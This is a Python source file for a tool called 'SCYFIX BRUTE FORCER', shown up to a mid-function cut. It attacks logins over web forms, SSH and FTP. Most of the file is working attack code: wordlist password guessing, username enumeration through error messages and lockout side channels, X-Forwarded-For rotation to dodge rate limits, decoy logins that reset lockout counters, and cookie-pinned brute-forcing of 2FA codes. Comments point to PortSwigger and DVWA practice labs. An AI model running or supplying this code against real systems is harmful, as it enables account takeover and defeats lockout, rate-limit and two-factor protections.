import requests
import requests.exceptions
from bs4 import BeautifulSoup
from termcolor import colored
from datetime import datetime
import time
import itertools
import string
import sys
import socket
import ftplib
import os
from collections import Counter

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

BLOCK_INDICATORS = [
    'ip has been blocked',
    'you have been blocked',
    'access denied',
    'too many requests',
    'rate limit',
    'rate-limit',
    'temporarily locked',
    'account locked',
    'ip blocked',
    'banned',
    'captcha',
    'unusual activity',
    'suspicious activity',
    'try again later',
    'please wait',
    'service unavailable',
    '429',
]


def is_blocked_response(response_text):
    """Return True if the response looks like an IP block or rate-limit page."""
    lower = response_text.lower()
    return any(indicator in lower for indicator in BLOCK_INDICATORS)


DEFAULT_WORDLISTS = [
    '/usr/share/wordlists/rockyou.txt',
    '/usr/share/wordlists/rockyou.txt.gz',
    '/usr/share/dirb/wordlists/common.txt',
]

DEFAULT_USERLISTS = [
    '/usr/share/wordlists/metasploit/unix_users.txt',
    '/usr/share/wordlists/metasploit/default_userpass_for_services_unhashed.txt',
    '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
]


def get_default_wordlist():
    for path in DEFAULT_WORDLISTS:
        if os.path.exists(path):
            return path
    return None


def get_default_userlist():
    for path in DEFAULT_USERLISTS:
        if os.path.exists(path):
            return path
    return None


def prompt_wordlist():
    default_wl = get_default_wordlist()
    if default_wl:
        print(colored(f"  [+] Default wordlist found: {default_wl}", 'green'))
        wl_input = input(colored("[*] Press ENTER to use default or type custom path: ", 'cyan')).strip()
        return wl_input if wl_input else default_wl
    else:
        print(colored("  [!] No default wordlist found on this system", 'yellow'))
        return input(colored("[*] Enter path to password file: ", 'cyan')).strip()


def prompt_usernames():
    """
    Accepts either:
    - Comma separated usernames: admin,root,ftp
    - Path to a username wordlist file: /path/to/users.txt
    Returns a list of usernames.
    """
    default_ul = get_default_userlist()
    if default_ul:
        print(colored(f"  [+] Default username list found: {default_ul}", 'green'))

    print(colored("[*] Enter username(s), comma separated, or path to a username file", 'cyan'))
    if default_ul:
        print(colored(f"    Press ENTER to use default username list", 'cyan'))

    user_input = input(colored("[*] Usernames / file path: ", 'cyan')).strip()

    # Empty input — use default userlist
    if not user_input and default_ul:
        print(colored(f"  [+] Using default username list: {default_ul}", 'green'))
        return load_userlist(default_ul)

    # Check if it's a file path
    if os.path.exists(user_input):
        print(colored(f"  [+] Loading usernames from file: {user_input}", 'green'))
        return load_userlist(user_input)

    # Otherwise treat as comma separated usernames
    usernames = [u.strip() for u in user_input.split(',') if u.strip()]
    print(colored(f"  [+] Usernames: {usernames}", 'green'))
    return usernames


def load_userlist(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        print(colored(f"  [+] Loaded {len(users)} usernames", 'green'))
        return users
    except FileNotFoundError:
        print(colored(f"[-] Username file not found: {filepath}", 'red'))
        return []


def print_banner():
    print(colored("""
╔═══════════════════════════════════════════════════╗
║         SCYFIX BRUTE FORCER v3.4                  ║
║   Multi-Protocol Authentication Testing Tool      ║
║   Web | SSH | FTP | CSRF | Username Enum          ║
║   Decoy IP-Block Bypass | 2FA Code Brute-Force    ║
╚═══════════════════════════════════════════════════╝
""", 'cyan'))


# ════════════════════════════════════════════════════════════════
#  WEB FORM FUNCTIONS
# ════════════════════════════════════════════════════════════════

def detect_form(url, session):
    print(colored("\n[*] Detecting login form...", 'cyan'))
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'lxml')
        form = soup.find('form')
        if not form:
            print(colored("[-] No form detected on page", 'red'))
            return None, None, None, None

        method = form.get('method', 'post').lower()
        action = form.get('action', url)
        if not action.startswith('http'):
            base_path = url.rsplit('/', 1)[0]
            action = base_path + '/' + action.lstrip('/')

        fields = {}
        submit_fields = {}
        for input_tag in form.find_all('input'):
            name = input_tag.get('name')
            value = input_tag.get('value', '')
            input_type = input_tag.get('type', 'text').lower()
            if name:
                if input_type == 'submit':
                    submit_fields[name] = value
                else:
                    fields[name] = value

        all_fields = {**fields, **submit_fields}
        print(colored(f"  [+] Form method: {method.upper()}", 'green'))
        print(colored(f"  [+] Form action: {action}", 'green'))
        print(colored(f"  [+] Input fields: {list(fields.keys())}", 'green'))
        print(colored(f"  [+] Submit fields: {list(submit_fields.keys())}", 'green'))

        csrf_field = detect_csrf_field(fields)
        if csrf_field:
            print(colored(f"  [!] CSRF token detected: {csrf_field}", 'yellow'))
        else:
            print(colored("  [+] No CSRF token detected", 'green'))

        return method, action, all_fields, response
    except Exception as e:
        print(colored(f"[-] Error detecting form: {e}", 'red'))
        return None, None, None, None


def detect_csrf_field(fields):
    csrf_names = ['csrf', 'token', 'csrf_token', '_token', 'authenticity_token',
                  'user_token', '_csrf', 'csrfmiddlewaretoken', 'csrf_field']
    for field in fields:
        if field.lower() in csrf_names:
            return field
    return None


def get_fresh_token(url, session, csrf_field):
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'lxml')
        token_input = soup.find('input', {'name': csrf_field})
        if token_input:
            return token_input.get('value', '')
    except Exception:
        pass
    return None


def identify_fields(fields, submit_fields):
    username_keys = ['username', 'user', 'email', 'uname', 'usr']
    password_keys = ['password', 'pass', 'passwd', 'pwd', 'passw']
    username_field = None
    password_field = None
    for key in fields:
        if key.lower() in username_keys and key not in submit_fields:
            username_field = key
        if key.lower() in password_keys and key not in submit_fields:
            password_field = key
    if not username_field:
        print(colored("\n[!] Could not auto-detect username field", 'yellow'))
        print(colored(f"    Available fields: {list(fields.keys())}", 'yellow'))
        username_field = input(colored("    Enter username field name manually: ", 'yellow'))
    if not password_field:
        print(colored("[!] Could not auto-detect password field", 'yellow'))
        print(colored(f"    Available fields: {list(fields.keys())}", 'yellow'))
        password_field = input(colored("    Enter password field name manually: ", 'yellow'))
    print(colored(f"\n  [+] Username field: {username_field}", 'green'))
    print(colored(f"  [+] Password field: {password_field}", 'green'))
    return username_field, password_field


def web_attempt_login(url, session, method, action, fields, username_field,
                      password_field, username, password, fail_string, delay, csrf_field,
                      xff_ip=None, success_string=None):
    """
    Returns True ONLY on a positively-confirmed login success.

    Deciding success by "fail_string is absent" is unsafe: a login page
    has at least three response types -- success, invalid credentials,
    and locked/blocked -- and a lockout page contains neither the fail
    string nor, unless its exact wording happens to be in BLOCK_INDICATORS,
    a recognised block phrase. So "fail_string absent" wrongly fires on it.

    Instead we require a POSITIVE signal:
      - a locked/blocked response is never a success (checked first), and
      - success means either an explicit success_string is present, or
        (no success_string given) the request redirected AWAY from the
        login page -- a genuine login on these labs returns 302 to an
        authenticated page, while invalid/locked attempts stay put with 200.
    fail_string, when provided, is an extra veto on top, never the sole
    basis for a True.
    """
    if csrf_field:
        fresh_token = get_fresh_token(url, session, csrf_field)
        if fresh_token:
            fields[csrf_field] = fresh_token
    fields[username_field] = username
    fields[password_field] = password

    headers = {}
    if xff_ip:
        headers['X-Forwarded-For'] = xff_ip

    try:
        if method == 'post':
            response = session.post(action, data=fields, timeout=10,
                                    allow_redirects=True, headers=headers)
        else:
            response = session.get(action, params=fields, timeout=10,
                                   allow_redirects=True, headers=headers)
        time.sleep(delay)

        # A locked / rate-limited / blocked response is NEVER a success.
        if is_blocked_response(response.text):
            print(colored(f"\n[!] Block/lockout detected -- not a success, skipping attempt", 'yellow'))
            return False

        # An explicit fail string, when given, vetoes success.
        if fail_string and fail_string in response.text:
            return False

        # Positive confirmation required from here on.
        if success_string:
            return success_string in response.text

        # No success_string: trust a redirect away from the login page.
        # A genuine login returns 302 -> authenticated page; invalid and
        # locked attempts stay on the login page with 200 and no redirect.
        redirected = len(response.history) > 0 and response.url.rstrip('/') != action.rstrip('/')
        return redirected
    except requests.exceptions.ConnectionError:
        print(colored("\n[!] Connection error -- target may be blocking requests", 'red'))
        time.sleep(5)
        return False
    except requests.exceptions.Timeout:
        return False


def build_patterns(usernames):
    current_year = datetime.now().year
    patterns = []
    for username in usernames:
        base = username.lower()
        cap = username.capitalize()
        patterns += [
            base, cap, base + '123', cap + '123', base + '1234', cap + '1234',
            base + str(current_year), cap + str(current_year), base + '!', cap + '!',
            base + '@123', cap + '@123', 'password', 'Password', 'password123',
            'Password123', 'password!', 'Password!', '123456', '12345678',
            'admin', 'Admin', 'admin123', 'Admin123', 'letmein', 'Letmein123',
            'welcome', 'Welcome1', 'qwerty', 'Qwerty123',
        ]
    return patterns


# ════════════════════════════════════════════════════════════════
#  SSH ATTACK
# ════════════════════════════════════════════════════════════════

def ssh_attack(host, port, usernames, password_file, delay):
    if not PARAMIKO_AVAILABLE:
        print(colored("[-] paramiko not installed. Run: pip install paramiko --break-system-packages", 'red'))
        return None

    print(colored(f"\n[*] Starting SSH attack on {host}:{port}", 'cyan'))
    print(colored(f"[*] Usernames to try: {len(usernames)}", 'cyan'))
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(colored(f"[-] Password file not found: {password_file}", 'red'))
        return None

    total = len(passwords)
    print(colored(f"[*] Loaded {total} passwords", 'cyan'))

    for username in usernames:
        print(colored(f"\n[*] Attacking SSH user: {username}", 'yellow'))
        for count, password in enumerate(passwords, 1):
            password = password.strip()
            sys.stdout.write(colored(
                f"\r  [*] Trying ({count}/{total}): {username}:{password:<30}", 'red'))
            sys.stdout.flush()

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(host, port=port, username=username, password=password,
                               timeout=3, banner_timeout=3, auth_timeout=3)
                print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                print(colored(f"  [+] Username: {username}", 'green'))
                print(colored(f"  [+] Password: {password}", 'green'))
                client.close()
                return username, password
            except paramiko.AuthenticationException:
                pass
            except Exception:
                pass
            finally:
                try:
                    client.close()
                except:
                    pass
                time.sleep(delay)

    print(colored(f"\n\n[-] SSH attack complete -- no valid credentials found", 'red'))
    return None


# ════════════════════════════════════════════════════════════════
#  FTP ATTACK
# ════════════════════════════════════════════════════════════════

def ftp_attack(host, port, usernames, password_file, delay):
    print(colored(f"\n[*] Starting FTP attack on {host}:{port}", 'cyan'))
    print(colored(f"[*] Usernames to try: {len(usernames)}", 'cyan'))
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(colored(f"[-] Password file not found: {password_file}", 'red'))
        return None

    total = len(passwords)
    print(colored(f"[*] Loaded {total} passwords", 'cyan'))

    for username in usernames:
        print(colored(f"\n[*] Attacking FTP user: {username}", 'yellow'))
        for count, password in enumerate(passwords, 1):
            password = password.strip()
            sys.stdout.write(colored(
                f"\r  [*] Trying ({count}/{total}): {username}:{password:<30}", 'red'))
            sys.stdout.flush()
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=3)
                ftp.login(username, password)
                print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                print(colored(f"  [+] Username: {username}", 'green'))
                print(colored(f"  [+] Password: {password}", 'green'))
                ftp.quit()
                return username, password
            except ftplib.error_perm:
                pass
            except Exception:
                pass
            finally:
                time.sleep(delay)

    print(colored(f"\n\n[-] FTP attack complete -- no valid credentials found", 'red'))
    return None


def detect_protocol(host, port):
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect((host, port))
        banner = sock.recv(1024).decode(errors='ignore').strip()
        sock.close()
        if 'SSH' in banner:
            return 'ssh'
        elif '220' in banner:
            return 'ftp'
        else:
            return 'unknown'
    except:
        return 'unknown'


# ════════════════════════════════════════════════════════════════
#  USERNAME ENUMERATION (MODE 8)
# ════════════════════════════════════════════════════════════════

def username_enum(url, username_file, fail_string, password, delay, use_xff):
    """
    Iterates a username wordlist with a fixed password.
    Detects valid usernames by checking if the fail_string is ABSENT from the response.
    Supports X-Forwarded-For IP rotation to bypass rate limiting.
    """
    print(colored("\n[*] Starting username enumeration...", 'cyan'))

    try:
        with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(colored(f"[-] Username file not found: {username_file}", 'red'))
        return []

    total = len(usernames)
    print(colored(f"[*] Loaded {total} usernames from wordlist", 'cyan'))
    print(colored(f"[*] Fixed password: {password}", 'cyan'))
    if use_xff:
        print(colored("[*] X-Forwarded-For rotation: ENABLED", 'yellow'))
    else:
        print(colored("[*] X-Forwarded-For rotation: disabled", 'cyan'))

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    session.get(url, timeout=10)

    method, action, all_fields, _ = detect_form(url, session)
    if not method:
        print(colored("[-] Could not detect form -- exiting", 'red'))
        return []

    submit_field_names = ['login', 'submit', 'signin', 'btn', 'button']
    submit_fields = {k: v for k, v in all_fields.items() if k.lower() in submit_field_names}
    input_fields = {k: v for k, v in all_fields.items() if k.lower() not in submit_field_names}

    username_field, password_field = identify_fields(input_fields, submit_fields)
    csrf_field = detect_csrf_field(input_fields)

    print(colored(f"\n[*] Enumeration started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
    print(colored("=" * 55, 'cyan'))

    valid_usernames = []

    for count, username in enumerate(usernames, 1):
        xff_ip = f"10.{(count // 65025) % 256}.{(count // 255) % 256}.{count % 255}" if use_xff else None

        if csrf_field:
            fresh_token = get_fresh_token(url, session, csrf_field)
            if fresh_token:
                all_fields[csrf_field] = fresh_token

        all_fields[username_field] = username
        all_fields[password_field] = password

        headers = {}
        if xff_ip:
            headers['X-Forwarded-For'] = xff_ip

        sys.stdout.write(colored(
            f"\r  [*] Trying ({count}/{total}): {username:<30}", 'red'
        ))
        sys.stdout.flush()

        try:
            if method == 'post':
                response = session.post(action, data=all_fields.copy(), timeout=10,
                                        allow_redirects=True, headers=headers)
            else:
                response = session.get(action, params=all_fields.copy(), timeout=10,
                                       allow_redirects=True, headers=headers)
            time.sleep(delay)

            if is_blocked_response(response.text):
                print(colored(f"\n[!] Block/rate-limit detected -- skipping {username}", 'yellow'))
            elif fail_string not in response.text:
                print(colored(f"\n  [!] VALID USERNAME FOUND: {username}", 'green'))
                valid_usernames.append(username)

        except requests.exceptions.ConnectionError:
            print(colored("\n[!] Connection error -- sleeping 5s", 'red'))
            time.sleep(5)
        except requests.exceptions.Timeout:
            pass

    print(colored(f"\n\n[*] Enumeration complete at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))

    if valid_usernames:
        print(colored(f"\n[+] Valid usernames found: {valid_usernames}", 'green'))

        chain = input(colored("\n[*] Chain into password attack on found usernames? (y/n): ", 'cyan')).strip().lower()
        if chain == 'y':
            return valid_usernames
    else:
        print(colored("[-] No valid usernames found", 'red'))

    return valid_usernames


def username_enum_lockout(url, username_file, lockout_phrase, attempts_per_user, delay):
    """
    Username enumeration via account-lockout side channel.

    Some apps only track failed-attempt counts for usernames that actually
    exist. Hammering a non-existent username with wrong passwords never
    changes the response; hammering a REAL username eventually trips its
    lockout, and the response changes -- in length, wording, or both.

    Exact phrase matching is fragile: if the lockout message doesn't match
    what you typed byte-for-byte (different casing, punctuation, extra
    whitespace, a slightly different sentence), every username looks
    identical and nothing gets flagged -- a silent false negative, not a
    "no valid usernames" result.

    PRIMARY SIGNAL: intra-username response-length variation. Each
    candidate gets `attempts_per_user` requests in a row with wrong
    passwords. An invalid username has no account to lock, so every one
    of its attempts should return byte-identical boilerplate -- same
    length, every time. A valid username's responses should change
    partway through, once the attempt count crosses the lockout
    threshold -- the response length shifts from "invalid credentials"
    length to "locked out" length within that username's own sequence.
    This needs no assumption about how many usernames in the wordlist
    are valid vs invalid (unlike comparing across usernames), it's
    self-contained per username.

    SECONDARY SIGNALS (unioned in, never required): the optional
    lockout_phrase appearing in the final response, the generic
    BLOCK_INDICATORS list, and -- as an extra cross-check -- whether a
    username's final response length is an outlier against the overall
    majority length across the whole wordlist.
    """
    print(colored("\n[*] Starting lockout-triggered username enumeration...", 'cyan'))

    try:
        with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(colored(f"[-] Username file not found: {username_file}", 'red'))
        return []

    total = len(usernames)
    print(colored(f"[*] Loaded {total} usernames from wordlist", 'cyan'))
    print(colored(f"[*] Wrong-password attempts per username: {attempts_per_user}", 'cyan'))

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    session.get(url, timeout=10)

    method, action, all_fields, _ = detect_form(url, session)
    if not method:
        print(colored("[-] Could not detect form -- exiting", 'red'))
        return []

    submit_field_names = ['login', 'submit', 'signin', 'btn', 'button']
    submit_fields = {k: v for k, v in all_fields.items() if k.lower() in submit_field_names}
    input_fields = {k: v for k, v in all_fields.items() if k.lower() not in submit_field_names}

    username_field, password_field = identify_fields(input_fields, submit_fields)
    csrf_field = detect_csrf_field(input_fields)

    print(colored(f"\n[*] Enumeration started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
    print(colored("=" * 55, 'cyan'))

    wrong_passwords = [f"wrongpass{i}" for i in range(1, attempts_per_user + 1)]
    LENGTH_TOLERANCE = 3  # ignore trivial byte-noise (e.g. a token field of varying length)

    # Pass 1: hammer every username, recording the length of EVERY attempt
    # in its sequence (not just the last one) plus the final response text.
    results = []  # list of (username, attempt_lengths, final_response_text)

    for ucount, username in enumerate(usernames, 1):
        attempt_lengths = []
        last_response_text = ""

        for acount, wrong_password in enumerate(wrong_passwords, 1):
            if csrf_field:
                fresh_token = get_fresh_token(url, session, csrf_field)
                if fresh_token:
                    all_fields[csrf_field] = fresh_token

            all_fields[username_field] = username
            all_fields[password_field] = wrong_password

            sys.stdout.write(colored(
                f"\r  [*] User ({ucount}/{total}): {username:<25} attempt {acount}/{attempts_per_user}",
                'red'))
            sys.stdout.flush()

            try:
                if method == 'post':
                    response = session.post(action, data=all_fields.copy(), timeout=10,
                                            allow_redirects=True)
                else:
                    response = session.get(action, params=all_fields.copy(), timeout=10,
                                           allow_redirects=True)
                time.sleep(delay)
                last_response_text = response.text
                attempt_lengths.append(len(response.text))
            except requests.exceptions.ConnectionError:
                print(colored("\n[!] Connection error -- sleeping 5s", 'red'))
                time.sleep(5)
            except requests.exceptions.Timeout:
                pass

        results.append((username, attempt_lengths, last_response_text))

    print(colored(f"\n\n[*] Enumeration complete at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))

    # Secondary cross-check: overall majority final-response length.
    final_lengths = [lens[-1] for _, lens, _ in results if lens]
    length_counts = Counter(final_lengths)
    majority_length, majority_count = length_counts.most_common(1)[0] if length_counts else (None, 0)
    print(colored(
        f"\n[*] Cross-check: {len(length_counts)} distinct final-response length(s) seen, "
        f"majority = {majority_length} chars ({majority_count}/{total} usernames)", 'cyan'))

    valid_usernames = []
    for username, attempt_lengths, response_text in results:
        if not attempt_lengths:
            continue

        # PRIMARY: did this username's own responses change partway through?
        intra_shift = (max(attempt_lengths) - min(attempt_lengths)) > LENGTH_TOLERANCE

        # SECONDARY: phrase match, generic block indicators, or an outlier
        # against the whole wordlist's majority final length.
        phrase_hit = (lockout_phrase and lockout_phrase in response_text) or \
                     is_blocked_response(response_text)
        length_outlier = majority_length is not None and \
                         abs(attempt_lengths[-1] - majority_length) > LENGTH_TOLERANCE

        if intra_shift or phrase_hit or length_outlier:
            reason = []
            if intra_shift:
                reason.append(f"response length shifted within its own attempts {attempt_lengths}")
            if phrase_hit:
                reason.append("lockout phrase matched")
            if length_outlier:
                reason.append(f"final length {attempt_lengths[-1]} vs majority {majority_length}")
            print(colored(f"  [!] VALID USERNAME: {username} ({'; '.join(reason)})", 'green'))
            valid_usernames.append(username)

    if valid_usernames:
        print(colored(f"\n[+] Valid usernames found: {valid_usernames}", 'green'))
        chain = input(colored("\n[*] Chain into password attack on found usernames? (y/n): ", 'cyan')).strip().lower()
        if chain == 'y':
            return valid_usernames
    else:
        print(colored("[-] No valid usernames found", 'red'))

    return valid_usernames


# ════════════════════════════════════════════════════════════════
#  DECOY-INTERLEAVED ATTACK (MODE 9)
#  For brute-force protections where the failed-attempt counter resets
#  on ANY successful login from that IP -- not just a login to the
#  target account. We interleave a known-good decoy login between every
#  real guess so the counter never reaches the lockout threshold.
#  (e.g. PortSwigger "Broken brute-force protection, IP block")
# ════════════════════════════════════════════════════════════════

def decoy_interleave_attack(url, target_username, password_file, decoy_creds,
                             fail_string, delay):
    """
    decoy_creds: list of (username, password) tuples known to log in
    successfully. Rotated between guesses so the lockout counter keeps
    resetting on a real success before it can trip.
    """
    print(colored("\n[*] Starting decoy-interleaved attack...", 'cyan'))
    print(colored(f"[*] Target username: {target_username}", 'cyan'))
    print(colored(f"[*] Decoy accounts: {[u for u, _ in decoy_creds]}", 'cyan'))

    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [p.strip() for p in f.read().splitlines() if p.strip()]
    except FileNotFoundError:
        print(colored(f"[-] Password file not found: {password_file}", 'red'))
        return None

    total = len(passwords)
    print(colored(f"[*] Loaded {total} candidate passwords", 'cyan'))

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    session.get(url, timeout=10)

    method, action, all_fields, _ = detect_form(url, session)
    if not method:
        print(colored("[-] Could not detect form -- exiting", 'red'))
        return None

    submit_field_names = ['login', 'submit', 'signin', 'btn', 'button']
    submit_fields = {k: v for k, v in all_fields.items() if k.lower() in submit_field_names}
    input_fields = {k: v for k, v in all_fields.items() if k.lower() not in submit_field_names}

    username_field, password_field = identify_fields(input_fields, submit_fields)
    csrf_field = detect_csrf_field(input_fields)

    print(colored(f"\n[*] Attack started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
    print(colored("=" * 55, 'cyan'))

    decoy_idx = 0
    for count, password in enumerate(passwords, 1):
        # 1. Fire a decoy login first -- a genuine success resets the
        #    per-IP failed-attempt counter before we spend our guess.
        decoy_user, decoy_pass = decoy_creds[decoy_idx % len(decoy_creds)]
        decoy_idx += 1

        sys.stdout.write(colored(
            f"\r  [*] Resetting via decoy '{decoy_user}'...{' ' * 20}", 'yellow'))
        sys.stdout.flush()

        decoy_ok = web_attempt_login(url, session, method, action, all_fields,
                                     username_field, password_field,
                                     decoy_user, decoy_pass, fail_string, delay, csrf_field)
        if not decoy_ok:
            print(colored(
                f"\n[!] Decoy login for '{decoy_user}' did not succeed -- "
                "check the decoy credentials, the counter may not be resetting", 'red'))

        # 2. Now spend the real guess against the target account.
        sys.stdout.write(colored(
            f"\r  [*] Trying ({count}/{total}): {target_username}:{password:<30}", 'red'))
        sys.stdout.flush()

        if web_attempt_login(url, session, method, action, all_fields, username_field,
                             password_field, target_username, password, fail_string,
                             delay, csrf_field):
            print(colored(f"\n\n  [+] SUCCESS!", 'green'))
            print(colored(f"  [+] Username: {target_username}", 'green'))
            print(colored(f"  [+] Password: {password}", 'green'))
            return target_username, password

    print(colored(f"\n\n[-] Decoy-interleaved attack complete -- no valid credentials found", 'red'))
    return None


# ════════════════════════════════════════════════════════════════
#  NUMERIC CODE BRUTE-FORCE (MODE 10)
#  Cookie-pinned brute-force of a numeric code field (2FA/OTP/PIN) at a
#  fixed endpoint. Unlike the login modes, this does not detect a login
#  form -- it posts to one known action, holding a caller-supplied cookie
#  jar fixed (e.g. an authenticated session cookie plus a tampered
#  verify=<victim> cookie), and cycles the code field 0..(10^digits - 1)
#  with leading zeros. Success = a redirect away from the code page.
#  (e.g. PortSwigger "2FA broken logic")
# ════════════════════════════════════════════════════════════════

def parse_cookie_string(cookie_string):
    """Parse a raw 'k=v; k2=v2' Cookie header value into a dict."""
    jar = {}
    for part in cookie_string.split(';'):
        part = part.strip()
        if not part or '=' not in part:
            continue
        name, value = part.split('=', 1)
        jar[name.strip()] = value.strip()
    return jar


def numeric_code_bruteforce(code_url, cookie_string, code_field, digits,
                            delay, refresh_csrf):
    """
    code_url     : the endpoint that both serves the code page (GET, to grab
                   a CSRF token) and accepts the submission (POST).
    cookie_string: raw Cookie header value, e.g. 'session=...; verify=carlos'
    code_field   : the code input's field name (default 'mfa-code').
    digits       : code length; range is 0 .. 10**digits - 1, zero-padded.
    refresh_csrf : if True, re-fetch a fresh CSRF token before every POST
                   (slower, needed if the app rotates tokens per request).
    """
    print(colored("\n[*] Starting cookie-pinned numeric code brute-force...", 'cyan'))

    jar = parse_cookie_string(cookie_string)
    if not jar:
        print(colored("[-] No cookies parsed -- this attack needs the session "
                       "(and any tampered) cookies. Aborting.", 'red'))
        return None
    print(colored(f"[*] Cookies pinned: {list(jar.keys())}", 'cyan'))

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    for name, value in jar.items():
        session.cookies.set(name, value)

    # Grab the code page once to discover the form (field names + CSRF) and,
    # for this class of lab, to trigger code generation for the pinned user.
    try:
        page = session.get(code_url, timeout=10)
    except requests.exceptions.RequestException as e:
        print(colored(f"[-] Could not load code page: {e}", 'red'))
        return None

    soup = BeautifulSoup(page.text, 'lxml')
    form = soup.find('form')
    action = code_url
    csrf_field = None
    if form:
        form_action = form.get('action', code_url)
        if form_action:
            action = form_action if form_action.startswith('http') else \
                     code_url.rsplit('/', 1)[0] + '/' + form_action.lstrip('/')
        form_fields = {}
        for inp in form.find_all('input'):
            n = inp.get('name')
            if n:
                form_fields[n] = inp.get('value', '')
        csrf_field = detect_csrf_field(form_fields)
        if code_field not in form_fields:
            print(colored(f"[!] Warning: field '{code_field}' not found on the page. "
                           f"Fields seen: {list(form_fields.keys())}", 'yellow'))
    if csrf_field:
        print(colored(f"[*] CSRF field detected: {csrf_field}", 'cyan'))
    print(colored(f"[*] Submitting to: {action}", 'cyan'))

    def current_csrf():
        if not csrf_field:
            return None
        s = BeautifulSoup(session.get(code_url, timeout=10).text, 'lxml')
        tok = s.find('input', {'name': csrf_field})
        return tok.get('value', '') if tok else None

    csrf_value = None
    if csrf_field:
        tok = soup.find('input', {'name': csrf_field})
        csrf_value = tok.get('value', '') if tok else None

    total = 10 ** digits
    print(colored(f"[*] Brute-forcing {total} codes ({digits}-digit, zero-padded)", 'cyan'))
    print(colored(f"[*] Started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
    print(colored("=" * 55, 'cyan'))

    for n in range(total):
        code = str(n).zfill(digits)

        if refresh_csrf and csrf_field:
            csrf_value = current_csrf()

        data = {code_field: code}
        if csrf_field and csrf_value is not None:
            data[csrf_field] = csrf_value

        sys.stdout.write(colored(f"\r  [*] Trying ({n + 1}/{total}): {code}", 'red'))
        sys.stdout.flush()

        try:
            response = session.post(action, data=data, timeout=10, allow_redirects=True)
            time.sleep(delay)
        except requests.exceptions.ConnectionError:
            print(colored("\n[!] Connection error -- sleeping 5s", 'red'))
            time.sleep(5)
            continue
        except requests.exceptions.Timeout:
            continue

        if is_blocked_response(response.text):
            print(colored(f"\n[!] Block/lockout detected at code {code} -- pausing 5s", 'yellow'))
            time.sleep(5)
            continue

        # Success = redirected away from the code page.
        redirected = len(response.history) > 0 and \
                     response.url.rstrip('/') != action.rstrip('/') and \
                     response.url.rstrip('/') != code_url.rstrip('/')
        if redirected:
            print(colored(f"\n\n  [+] SUCCESS!", 'green'))
            print(colored(f"  [+] Code: {code}", 'green'))
            print(colored(f"  [+] Landed on: {response.url}", 'green'))
            return code

    print(colored(f"\n\n[-] Code brute-force complete -- no valid code found", 'red'))
    return None


# ════════════════════════════════════════════════════════════════
#  WEB ATTACK RUNNER
# ════════════════════════════════════════════════════════════════

def run_web_attack(mode, url, usernames, fail_string, delay):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    session.get(url, timeout=10)
    session.cookies.set('security', 'low')

    method, action, all_fields, _ = detect_form(url, session)
    if not method:
        print(colored("[-] Could not detect form -- exiting", 'red'))
        return None

    submit_field_names = ['login', 'submit', 'signin', 'btn', 'button']
    submit_fields = {k: v for k, v in all_fields.items() if k.lower() in submit_field_names}
    input_fields = {k: v for k, v in all_fields.items() if k.lower() not in submit_field_names}

    username_field, password_field = identify_fields(input_fields, submit_fields)
    csrf_field = detect_csrf_field(input_fields)

    print(colored(f"\n[*] Attack started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
    print(colored("=" * 55, 'cyan'))

    result = None

    if mode in ['1', '4']:
        password_file = prompt_wordlist()
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = f.read().splitlines()
        except FileNotFoundError:
            print(colored(f"[-] Password file not found", 'red'))
            passwords = []
        total = len(passwords)
        print(colored(f"[*] Loaded {total} passwords", 'cyan'))
        for username in usernames:
            print(colored(f"\n[*] Attacking username: {username}", 'yellow'))
            for count, password in enumerate(passwords, 1):
                password = password.strip()
                sys.stdout.write(colored(
                    f"\r  [*] Trying ({count}/{total}): {username}:{password:<30}", 'red'))
                sys.stdout.flush()
                if web_attempt_login(url, session, method, action, all_fields, username_field,
                                     password_field, username, password, fail_string, delay, csrf_field):
                    print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                    print(colored(f"  [+] Username: {username}", 'green'))
                    print(colored(f"  [+] Password: {password}", 'green'))
                    result = (username, password)
                    return result

    if mode in ['2', '4'] and not result:
        patterns = build_patterns(usernames)
        total = len(patterns)
        for username in usernames:
            print(colored(f"\n[*] Pattern attack on username: {username}", 'yellow'))
            for count, password in enumerate(patterns, 1):
                sys.stdout.write(colored(
